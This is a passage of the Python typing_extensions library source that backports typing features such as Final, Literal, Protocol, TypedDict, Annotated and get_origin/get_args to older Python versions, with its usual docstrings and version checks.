typing.TypeVar(\'T_contra\', contravariant=True)  # Ditto contravariant.\n\nClassVar = typing.ClassVar\n\n# On older versions of typing there is an internal class named "Final".\n# 3.8+\nif hasattr(typing, \'Final\') and sys.version_info[:2] >= (3, 7):\n    Final = typing.Final\n# 3.7\nelse:\n    class _FinalForm(typing._SpecialForm, _root=True):\n\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            item = typing._type_check(parameters,\n                                      f\'{self._name} accepts only a single type.\')\n            return typing._GenericAlias(self, (item,))\n\n    Final = _FinalForm(\'Final\',\n                       doc="""A special typing construct to indicate that a name\n                       cannot be re-assigned or overridden in a subclass.\n                       For example:\n\n                           MAX_SIZE: Final = 9000\n                           MAX_SIZE += 1  # Error reported by type checker\n\n                           class Connection:\n                               TIMEOUT: Final[int] = 10\n                           class FastConnector(Connection):\n                               TIMEOUT = 1  # Error reported by type checker\n\n                       There is no runtime checking of these properties.""")\n\nif sys.version_info >= (3, 11):\n    final = typing.final\nelse:\n    # @final exists in 3.8+, but we backport it for all versions\n    # before 3.11 to keep support for the __final__ attribute.\n    # See https://bugs.python.org/issue46342\n    def final(f):\n        """This decorator can be used to indicate to type checkers that\n        the decorated method cannot be overridden, and decorated class\n        cannot be subclassed. For example:\n\n            class Base:\n                @final\n                def done(self) -> None:\n                    ...\n            class Sub(Base):\n                def done(self) -> None:  # Error reported by type checker\n                    ...\n            @final\n            class Leaf:\n                ...\n            class Other(Leaf):  # Error reported by type checker\n                ...\n\n        There is no runtime checking of these properties. The decorator\n        sets the ``__final__`` attribute to ``True`` on the decorated object\n        to allow runtime introspection.\n        """\n        try:\n            f.__final__ = True\n        except (AttributeError, TypeError):\n            # Skip the attribute silently if it is not writable.\n            # AttributeError happens if the object has __slots__ or a\n            # read-only property, TypeError if it\'s a builtin class.\n            pass\n        return f\n\n\ndef IntVar(name):\n    return typing.TypeVar(name)\n\n\n# 3.8+:\nif hasattr(typing, \'Literal\'):\n    Literal = typing.Literal\n# 3.7:\nelse:\n    class _LiteralForm(typing._SpecialForm, _root=True):\n\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            return typing._GenericAlias(self, parameters)\n\n    Literal = _LiteralForm(\'Literal\',\n                           doc="""A type that can be used to indicate to type checkers\n                           that the corresponding value has a value literally equivalent\n                           to the provided parameter. For example:\n\n                               var: Literal[4] = 4\n\n                           The type checker understands that \'var\' is literally equal to\n                           the value 4 and no other value.\n\n                           Literal[...] cannot be subclassed. There is no runtime\n                           checking verifying that the parameter is actually a value\n                           instead of a type.""")\n\n\n_overload_dummy = typing._overload_dummy  # noqa\n\n\nif hasattr(typing, "get_overloads"):  # 3.11+\n    overload = typing.overload\n    get_overloads = typing.get_overloads\n    clear_overloads = typing.clear_overloads\nelse:\n    # {module: {qualname: {firstlineno: func}}}\n    _overload_registry = collections.defaultdict(\n        functools.partial(collections.defaultdict, dict)\n    )\n\n    def overload(func):\n        """Decorator for overloaded functions/methods.\n\n        In a stub file, place two or more stub definitions for the same\n        function in a row, each decorated with @overload.  For example:\n\n        @overload\n        def utf8(value: None) -> None: ...\n        @overload\n        def utf8(value: bytes) -> bytes: ...\n        @overload\n        def utf8(value: str) -> bytes: ...\n\n        In a non-stub file (i.e. a regular .py file), do the same but\n        follow it with an implementation.  The implementation should *not*\n        be decorated with @overload.  For example:\n\n        @overload\n        def utf8(value: None) -> None: ...\n        @overload\n        def utf8(value: bytes) -> bytes: ...\n        @overload\n        def utf8(value: str) -> bytes: ...\n        def utf8(value):\n            # implementation goes here\n\n        The overloads for a function can be retrieved at runtime using the\n        get_overloads() function.\n        """\n        # classmethod and staticmethod\n        f = getattr(func, "__func__", func)\n        try:\n            _overload_registry[f.__module__][f.__qualname__][\n                f.__code__.co_firstlineno\n            ] = func\n        except AttributeError:\n            # Not a normal function; ignore.\n            pass\n        return _overload_dummy\n\n    def get_overloads(func):\n        """Return all defined overloads for *func* as a sequence."""\n        # classmethod and staticmethod\n        f = getattr(func, "__func__", func)\n        if f.__module__ not in _overload_registry:\n            return []\n        mod_dict = _overload_registry[f.__module__]\n        if f.__qualname__ not in mod_dict:\n            return []\n        return list(mod_dict[f.__qualname__].values())\n\n    def clear_overloads():\n        """Clear all overloads in the registry."""\n        _overload_registry.clear()\n\n\n# This is not a real generic class.  Don\'t use outside annotations.\nType = typing.Type\n\n# Various ABCs mimicking those in collections.abc.\n# A few are simply re-exported for completeness.\n\n\nAwaitable = typing.Awaitable\nCoroutine = typing.Coroutine\nAsyncIterable = typing.AsyncIterable\nAsyncIterator = typing.AsyncIterator\nDeque = typing.Deque\nContextManager = typing.ContextManager\nAsyncContextManager = typing.AsyncContextManager\nDefaultDict = typing.DefaultDict\n\n# 3.7.2+\nif hasattr(typing, \'OrderedDict\'):\n    OrderedDict = typing.OrderedDict\n# 3.7.0-3.7.2\nelse:\n    OrderedDict = typing._alias(collections.OrderedDict, (KT, VT))\n\nCounter = typing.Counter\nChainMap = typing.ChainMap\nAsyncGenerator = typing.AsyncGenerator\nNewType = typing.NewType\nText = typing.Text\nTYPE_CHECKING = typing.TYPE_CHECKING\n\n\n_PROTO_WHITELIST = [\'Callable\', \'Awaitable\',\n                    \'Iterable\', \'Iterator\', \'AsyncIterable\', \'AsyncIterator\',\n                    \'Hashable\', \'Sized\', \'Container\', \'Collection\', \'Reversible\',\n                    \'ContextManager\', \'AsyncContextManager\']\n\n\ndef _get_protocol_attrs(cls):\n    attrs = set()\n    for base in cls.__mro__[:-1]:  # without object\n        if base.__name__ in (\'Protocol\', \'Generic\'):\n            continue\n        annotations = getattr(base, \'__annotations__\', {})\n        for attr in list(base.__dict__.keys()) + list(annotations.keys()):\n            if (not attr.startswith(\'_abc_\') and attr not in (\n                    \'__abstractmethods__\', \'__annotations__\', \'__weakref__\',\n                    \'_is_protocol\', \'_is_runtime_protocol\', \'__dict__\',\n                    \'__args__\', \'__slots__\',\n                    \'__next_in_mro__\', \'__parameters__\', \'__origin__\',\n                    \'__orig_bases__\', \'__extra__\', \'__tree_hash__\',\n                    \'__doc__\', \'__subclasshook__\', \'__init__\', \'__new__\',\n                    \'__module__\', \'_MutableMapping__marker\', \'_gorg\')):\n                attrs.add(attr)\n    return attrs\n\n\ndef _is_callable_members_only(cls):\n    return all(callable(getattr(cls, attr, None)) for attr in _get_protocol_attrs(cls))\n\n\n# 3.8+\nif hasattr(typing, \'Protocol\'):\n    Protocol = typing.Protocol\n# 3.7\nelse:\n\n    def _no_init(self, *args, **kwargs):\n        if type(self)._is_protocol:\n            raise TypeError(\'Protocols cannot be instantiated\')\n\n    class _ProtocolMeta(abc.ABCMeta):\n        # This metaclass is a bit unfortunate and exists only because of the lack\n        # of __instancehook__.\n        def __instancecheck__(cls, instance):\n            # We need this method for situations where attributes are\n            # assigned in __init__.\n            if ((not getattr(cls, \'_is_protocol\', False) or\n                 _is_callable_members_only(cls)) and\n                    issubclass(instance.__class__, cls)):\n                return True\n            if cls._is_protocol:\n                if all(hasattr(instance, attr) and\n                       (not callable(getattr(cls, attr, None)) or\n                        getattr(instance, attr) is not None)\n                       for attr in _get_protocol_attrs(cls)):\n                    return True\n            return super().__instancecheck__(instance)\n\n    class Protocol(metaclass=_ProtocolMeta):\n        # There is quite a lot of overlapping code with typing.Generic.\n        # Unfortunately it is hard to avoid this while these live in two different\n        # modules. The duplicated code will be removed when Protocol is moved to typing.\n        """Base class for protocol classes. Protocol classes are defined as::\n\n            class Proto(Protocol):\n                def meth(self) -> int:\n                    ...\n\n        Such classes are primarily used with static type checkers that recognize\n        structural subtyping (static duck-typing), for example::\n\n            class C:\n                def meth(self) -> int:\n                    return 0\n\n            def func(x: Proto) -> int:\n                return x.meth()\n\n            func(C())  # Passes static type check\n\n        See PEP 544 for details. Protocol classes decorated with\n        @typing_extensions.runtime act as simple-minded runtime protocol that checks\n        only the presence of given attributes, ignoring their type signatures.\n\n        Protocol classes can be generic, they are defined as::\n\n            class GenProto(Protocol[T]):\n                def meth(self) -> T:\n                    ...\n        """\n        __slots__ = ()\n        _is_protocol = True\n\n        def __new__(cls, *args, **kwds):\n            if cls is Protocol:\n                raise TypeError("Type Protocol cannot be instantiated; "\n                                "it can only be used as a base class")\n            return super().__new__(cls)\n\n        @typing._tp_cache\n        def __class_getitem__(cls, params):\n            if not isinstance(params, tuple):\n                params = (params,)\n            if not params and cls is not typing.Tuple:\n                raise TypeError(\n                    f"Parameter list to {cls.__qualname__}[...] cannot be empty")\n            msg = "Parameters to generic types must be types."\n            params = tuple(typing._type_check(p, msg) for p in params)  # noqa\n            if cls is Protocol:\n                # Generic can only be subscripted with unique type variables.\n                if not all(isinstance(p, typing.TypeVar) for p in params):\n                    i = 0\n                    while isinstance(params[i], typing.TypeVar):\n                        i += 1\n                    raise TypeError(\n                        "Parameters to Protocol[...] must all be type variables."\n                        f" Parameter {i + 1} is {params[i]}")\n                if len(set(params)) != len(params):\n                    raise TypeError(\n                        "Parameters to Protocol[...] must all be unique")\n            else:\n                # Subscripting a regular Generic subclass.\n                _check_generic(cls, params, len(cls.__parameters__))\n            return typing._GenericAlias(cls, params)\n\n        def __init_subclass__(cls, *args, **kwargs):\n            tvars = []\n            if \'__orig_bases__\' in cls.__dict__:\n                error = typing.Generic in cls.__orig_bases__\n            else:\n                error = typing.Generic in cls.__bases__\n            if error:\n                raise TypeError("Cannot inherit from plain Generic")\n            if \'__orig_bases__\' in cls.__dict__:\n                tvars = typing._collect_type_vars(cls.__orig_bases__)\n                # Look for Generic[T1, ..., Tn] or Protocol[T1, ..., Tn].\n                # If found, tvars must be a subset of it.\n                # If not found, tvars is it.\n                # Also check for and reject plain Generic,\n                # and reject multiple Generic[...] and/or Protocol[...].\n                gvars = None\n                for base in cls.__orig_bases__:\n                    if (isinstance(base, typing._GenericAlias) and\n                            base.__origin__ in (typing.Generic, Protocol)):\n                        # for error messages\n                        the_base = base.__origin__.__name__\n                        if gvars is not None:\n                            raise TypeError(\n                                "Cannot inherit from Generic[...]"\n                                " and/or Protocol[...] multiple types.")\n                        gvars = base.__parameters__\n                if gvars is None:\n                    gvars = tvars\n                else:\n                    tvarset = set(tvars)\n                    gvarset = set(gvars)\n                    if not tvarset <= gvarset:\n                        s_vars = \', \'.join(str(t) for t in tvars if t not in gvarset)\n                        s_args = \', \'.join(str(g) for g in gvars)\n                        raise TypeError(f"Some type variables ({s_vars}) are"\n                                        f" not listed in {the_base}[{s_args}]")\n                    tvars = gvars\n            cls.__parameters__ = tuple(tvars)\n\n            # Determine if this is a protocol or a concrete subclass.\n            if not cls.__dict__.get(\'_is_protocol\', None):\n                cls._is_protocol = any(b is Protocol for b in cls.__bases__)\n\n            # Set (or override) the protocol subclass hook.\n            def _proto_hook(other):\n                if not cls.__dict__.get(\'_is_protocol\', None):\n                    return NotImplemented\n                if not getattr(cls, \'_is_runtime_protocol\', False):\n                    if sys._getframe(2).f_globals[\'__name__\'] in [\'abc\', \'functools\']:\n                        return NotImplemented\n                    raise TypeError("Instance and class checks can only be used with"\n                                    " @runtime protocols")\n                if not _is_callable_members_only(cls):\n                    if sys._getframe(2).f_globals[\'__name__\'] in [\'abc\', \'functools\']:\n                        return NotImplemented\n                    raise TypeError("Protocols with non-method members"\n                                    " don\'t support issubclass()")\n                if not isinstance(other, type):\n                    # Same error as for issubclass(1, int)\n                    raise TypeError(\'issubclass() arg 1 must be a class\')\n                for attr in _get_protocol_attrs(cls):\n                    for base in other.__mro__:\n                        if attr in base.__dict__:\n                            if base.__dict__[attr] is None:\n                                return NotImplemented\n                            break\n                        annotations = getattr(base, \'__annotations__\', {})\n                        if (isinstance(annotations, typing.Mapping) and\n                                attr in annotations and\n                                isinstance(other, _ProtocolMeta) and\n                                other._is_protocol):\n                            break\n                    else:\n                        return NotImplemented\n                return True\n            if \'__subclasshook__\' not in cls.__dict__:\n                cls.__subclasshook__ = _proto_hook\n\n            # We have nothing more to do for non-protocols.\n            if not cls._is_protocol:\n                return\n\n            # Check consistency of bases.\n            for base in cls.__bases__:\n                if not (base in (object, typing.Generic) or\n                        base.__module__ == \'collections.abc\' and\n                        base.__name__ in _PROTO_WHITELIST or\n                        isinstance(base, _ProtocolMeta) and base._is_protocol):\n                    raise TypeError(\'Protocols can only inherit from other\'\n                                    f\' protocols, got {repr(base)}\')\n            cls.__init__ = _no_init\n\n\n# 3.8+\nif hasattr(typing, \'runtime_checkable\'):\n    runtime_checkable = typing.runtime_checkable\n# 3.7\nelse:\n    def runtime_checkable(cls):\n        """Mark a protocol class as a runtime protocol, so that it\n        can be used with isinstance() and issubclass(). Raise TypeError\n        if applied to a non-protocol class.\n\n        This allows a simple-minded structural check very similar to the\n        one-offs in collections.abc such as Hashable.\n        """\n        if not isinstance(cls, _ProtocolMeta) or not cls._is_protocol:\n            raise TypeError(\'@runtime_checkable can be only applied to protocol classes,\'\n                            f\' got {cls!r}\')\n        cls._is_runtime_protocol = True\n        return cls\n\n\n# Exists for backwards compatibility.\nruntime = runtime_checkable\n\n\n# 3.8+\nif hasattr(typing, \'SupportsIndex\'):\n    SupportsIndex = typing.SupportsIndex\n# 3.7\nelse:\n    @runtime_checkable\n    class SupportsIndex(Protocol):\n        __slots__ = ()\n\n        @abc.abstractmethod\n        def __index__(self) -> int:\n            pass\n\n\nif hasattr(typing, "Required"):\n    # The standard library TypedDict in Python 3.8 does not store runtime information\n    # about which (if any) keys are optional.  See https://bugs.python.org/issue38834\n    # The standard library TypedDict in Python 3.9.0/1 does not honour the "total"\n    # keyword with old-style TypedDict().  See https://bugs.python.org/issue42059\n    # The standard library TypedDict below Python 3.11 does not store runtime\n    # information about optional and required keys when using Required or NotRequired.\n    TypedDict = typing.TypedDict\n    _TypedDictMeta = typing._TypedDictMeta\n    is_typeddict = typing.is_typeddict\nelse:\n    def _check_fails(cls, other):\n        try:\n            if sys._getframe(1).f_globals[\'__name__\'] not in [\'abc\',\n                                                              \'functools\',\n                                                              \'typing\']:\n                # Typed dicts are only for static structural subtyping.\n                raise TypeError(\'TypedDict does not support instance and class checks\')\n        except (AttributeError, ValueError):\n            pass\n        return False\n\n    def _dict_new(*args, **kwargs):\n        if not args:\n            raise TypeError(\'TypedDict.__new__(): not enough arguments\')\n        _, args = args[0], args[1:]  # allow the "cls" keyword be passed\n        return dict(*args, **kwargs)\n\n    _dict_new.__text_signature__ = \'($cls, _typename, _fields=None, /, **kwargs)\'\n\n    def _typeddict_new(*args, total=True, **kwargs):\n        if not args:\n            raise TypeError(\'TypedDict.__new__(): not enough arguments\')\n        _, args = args[0], args[1:]  # allow the "cls" keyword be passed\n        if args:\n            typename, args = args[0], args[1:]  # allow the "_typename" keyword be passed\n        elif \'_typename\' in kwargs:\n            typename = kwargs.pop(\'_typename\')\n            import warnings\n            warnings.warn("Passing \'_typename\' as keyword argument is deprecated",\n                          DeprecationWarning, stacklevel=2)\n        else:\n            raise TypeError("TypedDict.__new__() missing 1 required positional "\n                            "argument: \'_typename\'")\n        if args:\n            try:\n                fields, = args  # allow the "_fields" keyword be passed\n            except ValueError:\n                raise TypeError(\'TypedDict.__new__() takes from 2 to 3 \'\n                                f\'positional arguments but {len(args) + 2} \'\n                                \'were given\')\n        elif \'_fields\' in kwargs and len(kwargs) == 1:\n            fields = kwargs.pop(\'_fields\')\n            import warnings\n            warnings.warn("Passing \'_fields\' as keyword argument is deprecated",\n                          DeprecationWarning, stacklevel=2)\n        else:\n            fields = None\n\n        if fields is None:\n            fields = kwargs\n        elif kwargs:\n            raise TypeError("TypedDict takes either a dict or keyword arguments,"\n                            " but not both")\n\n        ns = {\'__annotations__\': dict(fields)}\n        try:\n            # Setting correct module is necessary to make typed dict classes pickleable.\n            ns[\'__module__\'] = sys._getframe(1).f_globals.get(\'__name__\', \'__main__\')\n        except (AttributeError, ValueError):\n            pass\n\n        return _TypedDictMeta(typename, (), ns, total=total)\n\n    _typeddict_new.__text_signature__ = (\'($cls, _typename, _fields=None,\'\n                                         \' /, *, total=True, **kwargs)\')\n\n    class _TypedDictMeta(type):\n        def __init__(cls, name, bases, ns, total=True):\n            super().__init__(name, bases, ns)\n\n        def __new__(cls, name, bases, ns, total=True):\n            # Create new typed dict class object.\n            # This method is called directly when TypedDict is subclassed,\n            # or via _typeddict_new when TypedDict is instantiated. This way\n            # TypedDict supports all three syntaxes described in its docstring.\n            # Subclasses and instances of TypedDict return actual dictionaries\n            # via _dict_new.\n            ns[\'__new__\'] = _typeddict_new if name == \'TypedDict\' else _dict_new\n            tp_dict = super().__new__(cls, name, (dict,), ns)\n\n            annotations = {}\n            own_annotations = ns.get(\'__annotations__\', {})\n            msg = "TypedDict(\'Name\', {f0: t0, f1: t1, ...}); each t must be a type"\n            own_annotations = {\n                n: typing._type_check(tp, msg) for n, tp in own_annotations.items()\n            }\n            required_keys = set()\n            optional_keys = set()\n\n            for base in bases:\n                annotations.update(base.__dict__.get(\'__annotations__\', {}))\n                required_keys.update(base.__dict__.get(\'__required_keys__\', ()))\n                optional_keys.update(base.__dict__.get(\'__optional_keys__\', ()))\n\n            annotations.update(own_annotations)\n            for annotation_key, annotation_type in own_annotations.items():\n                annotation_origin = get_origin(annotation_type)\n                if annotation_origin is Annotated:\n                    annotation_args = get_args(annotation_type)\n                    if annotation_args:\n                        annotation_type = annotation_args[0]\n                        annotation_origin = get_origin(annotation_type)\n\n                if annotation_origin is Required:\n                    required_keys.add(annotation_key)\n                elif annotation_origin is NotRequired:\n                    optional_keys.add(annotation_key)\n                elif total:\n                    required_keys.add(annotation_key)\n                else:\n                    optional_keys.add(annotation_key)\n\n            tp_dict.__annotations__ = annotations\n            tp_dict.__required_keys__ = frozenset(required_keys)\n            tp_dict.__optional_keys__ = frozenset(optional_keys)\n            if not hasattr(tp_dict, \'__total__\'):\n                tp_dict.__total__ = total\n            return tp_dict\n\n        __instancecheck__ = __subclasscheck__ = _check_fails\n\n    TypedDict = _TypedDictMeta(\'TypedDict\', (dict,), {})\n    TypedDict.__module__ = __name__\n    TypedDict.__doc__ = \\\n        """A simple typed name space. At runtime it is equivalent to a plain dict.\n\n        TypedDict creates a dictionary type that expects all of its\n        instances to have a certain set of keys, with each key\n        associated with a value of a consistent type. This expectation\n        is not checked at runtime but is only enforced by type checkers.\n        Usage::\n\n            class Point2D(TypedDict):\n                x: int\n                y: int\n                label: str\n\n            a: Point2D = {\'x\': 1, \'y\': 2, \'label\': \'good\'}  # OK\n            b: Point2D = {\'z\': 3, \'label\': \'bad\'}           # Fails type check\n\n            assert Point2D(x=1, y=2, label=\'first\') == dict(x=1, y=2, label=\'first\')\n\n        The type info can be accessed via the Point2D.__annotations__ dict, and\n        the Point2D.__required_keys__ and Point2D.__optional_keys__ frozensets.\n        TypedDict supports two additional equivalent forms::\n\n            Point2D = TypedDict(\'Point2D\', x=int, y=int, label=str)\n            Point2D = TypedDict(\'Point2D\', {\'x\': int, \'y\': int, \'label\': str})\n\n        The class syntax is only supported in Python 3.6+, while two other\n        syntax forms work for Python 2.7 and 3.2+\n        """\n\n    if hasattr(typing, "_TypedDictMeta"):\n        _TYPEDDICT_TYPES = (typing._TypedDictMeta, _TypedDictMeta)\n    else:\n        _TYPEDDICT_TYPES = (_TypedDictMeta,)\n\n    def is_typeddict(tp):\n        """Check if an annotation is a TypedDict class\n\n        For example::\n            class Film(TypedDict):\n                title: str\n                year: int\n\n            is_typeddict(Film)  # => True\n            is_typeddict(Union[list, str])  # => False\n        """\n        return isinstance(tp, tuple(_TYPEDDICT_TYPES))\n\n\nif hasattr(typing, "assert_type"):\n    assert_type = typing.assert_type\n\nelse:\n    def assert_type(__val, __typ):\n        """Assert (to the type checker) that the value is of the given type.\n\n        When the type checker encounters a call to assert_type(), it\n        emits an error if the value is not of the specified type::\n\n            def greet(name: str) -> None:\n                assert_type(name, str)  # ok\n                assert_type(name, int)  # type checker error\n\n        At runtime this returns the first argument unchanged and otherwise\n        does nothing.\n        """\n        return __val\n\n\nif hasattr(typing, "Required"):\n    get_type_hints = typing.get_type_hints\nelse:\n    import functools\n    import types\n\n    # replaces _strip_annotations()\n    def _strip_extras(t):\n        """Strips Annotated, Required and NotRequired from a given type."""\n        if isinstance(t, _AnnotatedAlias):\n            return _strip_extras(t.__origin__)\n        if hasattr(t, "__origin__") and t.__origin__ in (Required, NotRequired):\n            return _strip_extras(t.__args__[0])\n        if isinstance(t, typing._GenericAlias):\n            stripped_args = tuple(_strip_extras(a) for a in t.__args__)\n            if stripped_args == t.__args__:\n                return t\n            return t.copy_with(stripped_args)\n        if hasattr(types, "GenericAlias") and isinstance(t, types.GenericAlias):\n            stripped_args = tuple(_strip_extras(a) for a in t.__args__)\n            if stripped_args == t.__args__:\n                return t\n            return types.GenericAlias(t.__origin__, stripped_args)\n        if hasattr(types, "UnionType") and isinstance(t, types.UnionType):\n            stripped_args = tuple(_strip_extras(a) for a in t.__args__)\n            if stripped_args == t.__args__:\n                return t\n            return functools.reduce(operator.or_, stripped_args)\n\n        return t\n\n    def get_type_hints(obj, globalns=None, localns=None, include_extras=False):\n        """Return type hints for an object.\n\n        This is often the same as obj.__annotations__, but it handles\n        forward references encoded as string literals, adds Optional[t] if a\n        default value equal to None is set and recursively replaces all\n        \'Annotated[T, ...]\', \'Required[T]\' or \'NotRequired[T]\' with \'T\'\n        (unless \'include_extras=True\').\n\n        The argument may be a module, class, method, or function. The annotations\n        are returned as a dictionary. For classes, annotations include also\n        inherited members.\n\n        TypeError is raised if the argument is not of a type that can contain\n        annotations, and an empty dictionary is returned if no annotations are\n        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the\n          globals from obj (or the respective module\'s globals for classes),\n          and these are also used as the locals.  If the object does not appear\n          to have globals, an empty dictionary is used.\n\n        - If one dict argument is passed, it is used for both globals and\n          locals.\n\n        - If two dict arguments are passed, they specify globals and\n          locals, respectively.\n        """\n        if hasattr(typing, "Annotated"):\n            hint = typing.get_type_hints(\n                obj, globalns=globalns, localns=localns, include_extras=True\n            )\n        else:\n            hint = typing.get_type_hints(obj, globalns=globalns, localns=localns)\n        if include_extras:\n            return hint\n        return {k: _strip_extras(t) for k, t in hint.items()}\n\n\n# Python 3.9+ has PEP 593 (Annotated)\nif hasattr(typing, \'Annotated\'):\n    Annotated = typing.Annotated\n    # Not exported and not a public API, but needed for get_origin() and get_args()\n    # to work.\n    _AnnotatedAlias = typing._AnnotatedAlias\n# 3.7-3.8\nelse:\n    class _AnnotatedAlias(typing._GenericAlias, _root=True):\n        """Runtime representation of an annotated type.\n\n        At its core \'Annotated[t, dec1, dec2, ...]\' is an alias for the type \'t\'\n        with extra annotations. The alias behaves like a normal typing alias,\n        instantiating is the same as instantiating the underlying type, binding\n        it to types is also the same.\n        """\n        def __init__(self, origin, metadata):\n            if isinstance(origin, _AnnotatedAlias):\n                metadata = origin.__metadata__ + metadata\n                origin = origin.__origin__\n            super().__init__(origin, origin)\n            self.__metadata__ = metadata\n\n        def copy_with(self, params):\n            assert len(params) == 1\n            new_type = params[0]\n            return _AnnotatedAlias(new_type, self.__metadata__)\n\n        def __repr__(self):\n            return (f"typing_extensions.Annotated[{typing._type_repr(self.__origin__)}, "\n                    f"{\', \'.join(repr(a) for a in self.__metadata__)}]")\n\n        def __reduce__(self):\n            return operator.getitem, (\n                Annotated, (self.__origin__,) + self.__metadata__\n            )\n\n        def __eq__(self, other):\n            if not isinstance(other, _AnnotatedAlias):\n                return NotImplemented\n            if self.__origin__ != other.__origin__:\n                return False\n            return self.__metadata__ == other.__metadata__\n\n        def __hash__(self):\n            return hash((self.__origin__, self.__metadata__))\n\n    class Annotated:\n        """Add context specific metadata to a type.\n\n        Example: Annotated[int, runtime_check.Unsigned] indicates to the\n        hypothetical runtime_check module that this type is an unsigned int.\n        Every other consumer of this type can ignore this metadata and treat\n        this type as int.\n\n        The first argument to Annotated must be a valid type (and will be in\n        the __origin__ field), the remaining arguments are kept as a tuple in\n        the __extra__ field.\n\n        Details:\n\n        - It\'s an error to call `Annotated` with less than two arguments.\n        - Nested Annotated are flattened::\n\n            Annotated[Annotated[T, Ann1, Ann2], Ann3] == Annotated[T, Ann1, Ann2, Ann3]\n\n        - Instantiating an annotated type is equivalent to instantiating the\n        underlying type::\n\n            Annotated[C, Ann1](5) == C(5)\n\n        - Annotated can be used as a generic type alias::\n\n            Optimized = Annotated[T, runtime.Optimize()]\n            Optimized[int] == Annotated[int, runtime.Optimize()]\n\n            OptimizedList = Annotated[List[T], runtime.Optimize()]\n            OptimizedList[int] == Annotated[List[int], runtime.Optimize()]\n        """\n\n        __slots__ = ()\n\n        def __new__(cls, *args, **kwargs):\n            raise TypeError("Type Annotated cannot be instantiated.")\n\n        @typing._tp_cache\n        def __class_getitem__(cls, params):\n            if not isinstance(params, tuple) or len(params) < 2:\n                raise TypeError("Annotated[...] should be used "\n                                "with at least two arguments (a type and an "\n                                "annotation).")\n            allowed_special_forms = (ClassVar, Final)\n            if get_origin(params[0]) in allowed_special_forms:\n                origin = params[0]\n            else:\n                msg = "Annotated[t, ...]: t must be a type."\n                origin = typing._type_check(params[0], msg)\n            metadata = tuple(params[1:])\n            return _AnnotatedAlias(origin, metadata)\n\n        def __init_subclass__(cls, *args, **kwargs):\n            raise TypeError(\n                f"Cannot subclass {cls.__module__}.Annotated"\n            )\n\n# Python 3.8 has get_origin() and get_args() but those implementations aren\'t\n# Annotated-aware, so we can\'t use those. Python 3.9\'s versions don\'t support\n# ParamSpecArgs and ParamSpecKwargs, so only Python 3.10\'s versions will do.\nif sys.version_info[:2] >= (3, 10):\n    get_origin = typing.get_origin\n    get_args = typing.get_args\n# 3.7-3.9\nelse:\n    try:\n        # 3.9+\n        from typing import _BaseGenericAlias\n    except ImportError:\n        _BaseGenericAlias = typing._GenericAlias\n    try:\n        # 3.9+\n        from typing import GenericAlias as _typing_GenericAlias\n    except ImportError:\n        _typing_GenericAlias = typing._GenericAlias\n\n    def get_origin(tp):\n        """Get the unsubscripted version of a type.\n\n        This supports generic types, Callable, Tuple, Union, Literal, Final, ClassVar\n        and Annotated. Return None for unsupported types. Examples::\n\n            get_origin(Literal[42]) is Literal\n            get_origin(int) is None\n            get_origin(ClassVar[int]) is ClassVar\n            get_origin(Generic) is Generic\n            get_origin(Generic[T]) is Generic\n            get_origin(Union[T, int]) is Union\n            get_origin(List[Tuple[T, T]][int]) == list\n            get_origin(P.args) is P\n        """\n        if isinstance(tp, _AnnotatedAlias):\n            return Annotated\n        if isinstance(tp, (typing._GenericAlias, _typing_GenericAlias, _BaseGenericAlias,\n                           ParamSpecArgs, ParamSpecKwargs)):\n            return tp.__origin__\n        if tp is typing.Generic:\n            return typing.Generic\n        return None\n\n    def get_args(tp):\n        """Get type arguments with all substitutions performed.\n\n        For unions, basic simplifications used by Union constructor are performed.\n        Examples::\n            get_args(Dict[str, int]) == (str, int)\n            get_args(int) == ()\n            get_args(Union[int, Union[T, int], str][int]) == (int, str)\n            get_args(Union[int, Tuple[T, int]][str]) == (int, Tuple[str, int])\n            get_args(Callable[[], T][int]) == ([], int)\n        """\n        if isinstance(tp, _AnnotatedAlias):\n            return (tp.__origin__,) + tp.__metadata__\n        if isinstance(tp, (typing._GenericAlias, _typing_GenericAlias)):\n            if getattr(tp, "_special", False):\n                return ()\n            res = tp.__args__\n            if get_origin(tp) is collections.abc.Callable and res[0] is not Ellipsis:\n                res = (list(res[:-1]), res[-1])\n            return res\n        return ()\n\n\n# 3.10+\nif hasattr(typing, \'TypeAlias\'):\n    TypeAlias = typing.TypeAlias\n# 3.9\nelif sys.version_info[:2] >= (3, 9):\n    class _TypeAliasForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n    @_TypeAliasForm\n    def TypeAlias(self, parameters):\n        """Special marker indicating that an assignment should\n        be recognized as a proper type alias definition by type\n        checkers.\n\n        For example::\n\n            Predicate: TypeAlias = Callable[..., bool]\n\n        It\'s invalid when used anywhere except as in the example above.\n        """\n        raise TypeError(f"{self} is not subscriptable")\n# 3.7-3.8\nelse:\n    class _TypeAliasForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n    TypeAlias = _TypeAliasForm(\'TypeAlias\',\n                               doc="""Special marker indicating that an assignment should\n                               be recognized as a proper type alias definition by type\n                               checkers.\n\n                               For example::\n\n                                   Predicate: TypeAlias = Callable[..., bool]\n\n                               It\'s invalid when used anywhere except as in the example\n                               above.""")\n\n\n# Python 3.10+ has PEP 612\nif hasattr(typing, \'ParamSpecArgs\'):\n    ParamSpecArgs = typing.ParamSpecArgs\n    ParamSpecKwargs = typing.ParamSpecKwargs\n# 3.7-3.9\nelse:\n    class _Immutable:\n        """Mixin to indicate that object should not be copied."""\n        __slots__ = ()\n\n        def __copy__(self):\n            return self\n\n        def __deepcopy__(self, memo):\n            return self\n\n    class ParamSpecArgs(_Immutable):\n        """The args for a ParamSpec object.\n\n        Given a ParamSpec object P, P.args is an instance of ParamSpecArgs.\n\n        ParamSpecArgs objects have a reference back to their ParamSpec:\n\n        P.args.__origin__ is P\n\n        This type is meant for runtime introspection and has no special meaning to\n        static type checkers.\n        """\n        def __init__(self, origin):\n            self.__origin__ = origin\n\n        def __repr__(self):\n            return f"{self.__origin__.__name__}.args"\n\n        def __eq__(self, other):\n            if not isinstance(other, ParamSpecArgs):\n                return NotImplemented\n            return self.__origin__ == other.__origin__\n\n    class ParamSpecKwargs(_Immutable):\n        """The kwargs for a ParamSpec object.\n\n        Given a ParamSpec object P, P.kwargs is an instance of ParamSpecKwargs.\n\n        